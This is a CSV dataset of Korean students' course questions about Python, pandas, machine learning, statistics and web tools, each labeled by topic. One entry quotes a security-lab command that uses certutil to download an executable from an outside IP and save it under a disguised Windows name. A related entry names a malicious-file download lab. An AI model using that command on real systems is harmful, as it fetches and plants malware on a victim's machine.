text,label
"안녕하세요

방금 개별과제 제출에 문제가 생겨서 문의드립니다ㅠㅠ

모르고 백지(과제 원본 파일)를 제출했는데

다시 제출해도 되는걸까요?

죄송합니다ㅠ",시스템 운영
"코딩마스터스 3360
# -*- coding: utf-8 -*-
import sys
a = 0
while(True):
    k = int(input())   
    if(1 &lt;= k &lt;= 100000000):
        while(True):
            if (k & 2 == 1):
                k=k+1
                continue
            elif (k % 2 == 0):
                a = k // 2
                if (a % 2 == 1):
                    print(a)
                    break
                elif (a % 2 == 0):
                    k=k+1
                    continue

를 풀고 있는데
while문이 어디서 잘못된 건지 무한루프만 도네요..
중간에 print문을 넣어봐서 홀수일 경우에 print(""짝수가 아닙니다."")를 해봐도
잘 작동해서 홀수도 판별되는데... 아마 제가 while문 어디에서 잘못 쓴 것 같아 질문을 드립니다...",코드1
원격 요청 다시한번 드리니다!,원격
AIDU에 저장해놓으라고 공지를 받았는데 튜터6님이 aivle-edu에 제출을 하라고 하셨는데 어떻게 해야할까요?,시스템 운영
"# -*- coding: utf-8 -*-
import sys

dic = {}
a = int(sys.stdin.readline())
for i in range(a):
    b = sys.stdin.readline()
    # 딕셔너리 요소 추가
    dic[b.split()[0]] = int(b.split()[1]) 

# 정렬된 리스트형, 리스트 안의 값은 튜플   
sorted_dict = sorted(dic.items(), key = lambda item: (item[1], item[0]) )
# print(sorted_dict)

# 학생 이름 출력
for ii in range(a):
    print(sorted_dict[ii][0], end = ' ')",코드1
"첨부와 같이 air_2021, air_2022 파일의 측정일시를 datetime으로 변환하려고 하는데
오류메시지에 unconverted data remains: 4 라고 뜹니다
두 파일다 이상치가 4 건 있어서 datetime변환이 안되는걸까요?
아니면 코드상에 오류가있어서 그러는 걸까요?",코드2
"2. 모델이 과적합인지는 어떻게 판단할 수 있을까요?

예를 들어, train_loss 와 validation_loss가 0에 가까워질 정도로 매우 작아진다면 과적합이라고 판단할 수 있을까요?

아니라면 과적합은 test set으로만 검정할 수 있을까요?



답변 부탁드립니다. 감사합니다.",이론
"이렇게 했는데 왜 fail이 뜰까요...?
감도 안 옵니다...ㅠㅠ",코드1
"df_total = pd.merge(df_total,df_pnu,df_sig,on='RID')를 작성하고 실행하니 에러코드가
The truth value of a DataFrame is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.a 라고 뜨는데 어떻게 해결하나요?",코드2
"제가 강사님 설명을 이해 못 한 것 같아서 다시 여쭤봅니다ㅠㅠ
(60000, 28, 28) 구조에서 스케일링하기 위해 (60000, 784) 구조로 바꿨는데 그럼 minmaxscaler를 사용하면 되는데 왜 직접 min, max값을 구해서 스케일링을 한 건가요??

그리구 왜 이미지를 2차원에서 1차원 구조로 바꾸는지도......... 갑자기 이해가 되지 않습니당.................ㅠ",코드2
"html 문서를 보면 head 안에 script 하나, body안에 script 하나 있습니다 그런데 이렇게 출력을 해보면 body안의 script는 출력이 되지 않는데 왜 그런가요",웹
"제가 (base)가 안떠서 쁘띠 껐다가 다시 켰는데 원래로 복구하는 방법을 모르겠습니다,,",웹
강사님께서 자동완성이 가능하다고 하셨는데 저는 여태껏 aidu 이용하면서 자동완성이 안 되어서 일일이 쳐서 했었습니다. 제가 따로 설정을 해야 하는건가요?,시스템 운영
"알려주신 명령어 입력해보았으나

C:\Users\User\Downloads&gt;chmod 400 d023122_mykey.pem
'chmod'은(는) 내부 또는 외부 명령, 실행할 수 있는 프로그램, 또는
배치 파일이 아닙니다.

해당 오류로 실행이 되지 않습니다.
pem파일은 다운로드 폴더에 잘 있는데 이상하네요",웹
"def reverse_list(a):
    n = len(a)
    for i in range(n // 2):
        a[i], a[n - i - 1] = a[n - i - 1], a[i]
        
print('리스트의 최댓값을 구합니다.')
num = int(input('원소 수를 입력하세요.: '))
x = [None] * num # 원소 수가 num인 리스트를 생성

for i in range(num):
    x[i] = int(input(f'x[{i}]값을 입력하세요.: '))

reverse_list(x)

print('리스트 역순 출력')
for i in range(num):
    print(x[i] == x[i])

마지막 줄 print줄을 강사님이 하신건
for i in range(num):
    print(f'x[{i}] = {x[i]}')

이렇게 f를  붙치고 출력하셨는데 붙치지 않고 출력하기 위해서 어떻게 바꿔야 하나요? f를 붙치는게 불편해서 안붙치는 방식으로 해보고 싶습니다 !
또한 f를 붙치는 정확한 이유가 궁금합니다",코드1
"안녕하세요, 주신 팁으로 문제를 풀 수 있었습니다. 감사합니다! 그런데 한 가지 더 궁금한 점이 있습니다. 제가 decimal 모듈을 import해서 문제를 풀었는데, 혹시 이런 모듈을 사용하지 않을 수 있는 방법도 있을까요? 아래가 제 코드입니다!
------------------------------------
from decimal import *
p, q = map(int, input().split())
n = int(input())
getcontext().prec = n 
 
r = Decimal(p)/Decimal(q)",코드1
case6에서 실패하는데 코드에 어떤 문제가 있을까요?,코드1
"안녕하세요, 멘토님!
통계관련 수업이 어렵지만 열심히 자료도 찾아보면서 따라가려고 하고 있습니다..!

오늘 ttest 관련 수업을 듣다가 궁금한 점이 있어 문의드립니다.

제가 이해하기로는
ttest값은 +- 2를 기준으로 귀무가설 채택여부를 결정하고,
유의수준은 분포에서 0.05를 기준으로 설정 된다고 이해했습니다.

그런데 +-2는 고정된 값이고, 
반면에 유의수준에 따라서 나누면 만약 그래프의 꼬리가 두꺼운가 혹은 얇은가에 따라서 값이 변하는게 아닌가요..?

그렇다면 만약 그래프에 따라서 t-값이 +-2보다는 큰데,  p-value값이 유의수준보다 커지는 경우가 생길수도 있나요?
그런 경우가 생긴다면 어떤 값을 기준으로 귀무가설을 채택할지 기각할지를 결정하게 되나요?

이해가 어려워서 맞는 질문인지도 잘 모르겠지만... 답변해주시면 열심히 이해해보겠습니다..
감사합니다..",이론
"안녕하세요!

피피티 산출물에 개인 스크립트하는 부분이 똑같은 페이지가 2장 있어서
다르게 적어야하나요 ?

답변 감사합니다.",시스템 운영
"안녕하세요.

[실습#2-3 악성파일 다운로드 및 실행]
windows10세션 마지막 코드 입력시 다음 과 같은 에러메시지가 뜹니다.
'WindowSearch.exe' is not recognized as an internal or external command, operable program or batch file.

오류 해결을 위한 방법 문의드립니다. ㅠㅠ

",웹
"xgboost에 해당하는 오류는 이렇게 나오고
Invalid classes inferred from unique values of `y`.  Expected: [0 1], got ['-1' '1'] 
 lightgbm에 해당하는 오류는 
 Do not support special JSON characters in feature name. 
이렇게 나옵니다 ㅠ 
나머지 KNN, DT, Logistic Regression, Random Forest 는 잘 되는데 왜 저 두개 만 잘 안나오게 될까요.. ?",코드2
"C:\Users\User\anaconda3\lib\site-packages\seaborn\_decorators.py:36: FutureWarning: Pass the following variable as a keyword arg: x. From version 0.12, the only valid positional argument will be `data`, and passing other arguments without an explicit keyword will result in an error or misinterpretation.
  warnings.warn(

그래프가 나타나는데 이런 오류가 뜨는 이유가 무엇인지 궁금합니다.

덧붙여 이전 문의에 !pip install -U nbformat 를 이용하였으나 문제가 해결되지 않습니다 어떻게해야 할지 여쭤봅니다.",코드2
"df_soul_bus_station.csv 부분에서 계속 에러가 뜹니다
No such file or directory: 'df_seoul_bus_station.csv' 이부분을 어떻게 해결하나요?",코드2
Amt를 기준으로 나눠도 될까요??,코드2
"안녕하세요 
디렉토리를 파일 경로를 텍스트로 복사해서 사용해보고 다른 파일로 디렉토리를 옮겨서도 시도해봤는데
계속 되지 않고 있습니다. 
혹시 h5파일을 로드할때 별도로 주의해야 할 사항이 있을까요?

감사합니다",코드2
"HOUSE--CHURN 부분 로지스트 회기 부분 관련 질문입니다. 
결측치 제거 후 실행을 하니 오류가 뜹니다. 코드 부분이 잘못 된 것 같은데 알려주세요ㅠㅠ",코드2
"질문2)
첫 번째 코드 실행 값의 정확한 의미가 궁금합니다. 
seoul_moving_night = seoul_moving[seoul_moving['도착시간']&lt;5]
seoul_moving_night['요일'].value_counts()
→ 해당 실행 값을 요일 별 심야 이동 값으로 볼 수 있는 이유는 
     무엇을 기준으로 해석된 값일까요?
 → 단순히 각 행에 적힌 요일만 카운트 한 값이라고 보아도 될까요?
       토요일의 value_counts가 가장 많다면, 
       토요일에 심야 이동이 가장 많다고 보기보단 
       토요일의 카테고리 유형 조합이 가장 다양하다고 보아야 하는 게 맞을까요?",코드2
"안녕하세요! 실습하다가 궁금한 점이 생겨서 질문드립니다.
실습에서 머신러닝은 n-grams로 벡터화 된 데이터로 학습하고, 딥러닝은 sequence로 벡터화된 데이터로 학습하라 되어있는데 특별한 이유가 있는 건가요?
sequence로 된 데이터로 머신러닝을 진행하는 것과 n-grams로 된 데이터로 딥러닝을 진행하는 것은 못하는 건가요?",이론
"a = [1, 2, 3, 4, 5] 
s = 0
for num in a:  
    s = s + num              
print(s)          

여기서 num은 변수 선언?이 된적이 없는데 
그냥 막 써도 괜찮은 이유가 뭘까요??
",코드1
"model 파일을 수정하고 python manage.py makemigrations signlanguage 명령어를 실행시에 
아래와 같이 발생합니다. 어떤 부분을 수정을 해보면 될까요??

You are trying to add a non-nullable field 'version' to modelupload without a default; we can't do that (the database needs something to populate existing rows).
Please select a fix:
 1) Provide a one-off default now (will be set on all existing rows with a null value for this column)
 2) Quit, and let me add a default in models.py
Select an option:
Please select a valid option:",웹
동영상이 끊겨서 제대로 못봤는데 혹시 링크 주시면 제가 따로 잠시 볼 수 있을까요? ,시스템 운영
"AICE 시험을 진행할 때 사용할 라이브러리를 모두 설치해야 할까요?
'네이게이션 개선' 프로젝트에서는 아래의 명령어로 pandas, seaborn, xgboost 등 데이터 분석에 사용하는 라이브러리를 모두 설치해야 헀습니다.
!pip install pandas requests seaborn xgboost gspread oauth2client

AICE 시험 환경에서는 !pip 명령어로 라이브러리 설치를 모두 진행해야 하는지, 아니면 구글 코랩이나 DX 수업 노트북 환경처럼 라이브러리 추가 설치 없이 import 해올 수 있는지 궁금합니다.",시스템 운영
"항상 자세한 설명 감사드립니다!

아까 강사님께서 Fetch/XHR 을 선택하라고 하셨는데 왜 하는건지 이유를 잘 모르겠어요 ㅠ

",이론
"안녕하세요 튜터님:&gt;
혹시 '/content/yolov5/trained/train_street/weights/best.pt' 이 파일은 어떻게 해야 생성되는 건가요? 
train.py 를 돌려도 생성되지 않아 문의드립니다!",코드2
certutil -urlcache -f http://31.44.7.100/test.exe c:\users\public\WindowSearch.exe 를 입력했을 때 사진과 같은 오류가 발생합니다,웹
"dp 코드도 있는데 이거 한번 봐주시면 감사하겠습니다.

def sol2():
    n = int(input())
    cards = list(map(int, input().split()))
    maxDiff = -float('inf')
    
    def dfs(i, turn, chul, young):
        nonlocal maxDiff
        if i &gt;= n:
            maxDiff = max(maxDiff, chul - young)
            return
        
        for seqN in range(1, 4):
            seqScore = sum(cards[i:i+seqN])
            if i + seqN &gt; n:
                break
            if turn == 0:
                dfs(i+seqN, (turn + 1) % 2, chul + seqScore, young)
            else:
                dfs(i+seqN, (turn + 1) % 2, chul, young + seqScore)
                
            
    maxDiff = -float('inf')
    dfs(0, 0, 0, 0)
    turn0Max = maxDiff
    
    maxDiff = -float('inf')
    dfs(0, 1, 0, 0)
    turn1Max = maxDiff
    # print(turn0Max, turn1Max)
    
    # return max(turn0Max, turn1Max)
    return turn0Max

print(sol2())",코드1
클라이언트가 서버에 접속하기 위한 도구라고 생각해도 될까요?,이론
"3. 앞으로 print같은 함수는 수 천 번 쓰인다는 데, 편하게 쓸 수 있는 단축키가 있나요?",코드1
"해결 했습니다!
list[-id]라고 적은게 문제였네요ㅠㅠ
[-id]로 수정 했습니다!",웹
"net 객체에 input을 넣으면 앞서 정의한 forward 함수가 실행되고(순전파) 연산이 다 끝나고 아웃풋이 나오면, 그 아웃풋과의 loss 계산이 일어나게 되는데, 이게 바로 역전파라고 보면 될까요?
순전파와 역전파 순서? 과정이 조금 헷갈립니다.",이론
"CNN에서 파라미터를 업데이트하면 다음 커널을 구성하는 값들에 적용되나요?
아니면 커널을 구성하는 값들을 초기에 랜덤으로 지정한 뒤 역전파로 파라미터를 업데이트하게 되나요?

읽어주셔서 감사합니다",이론
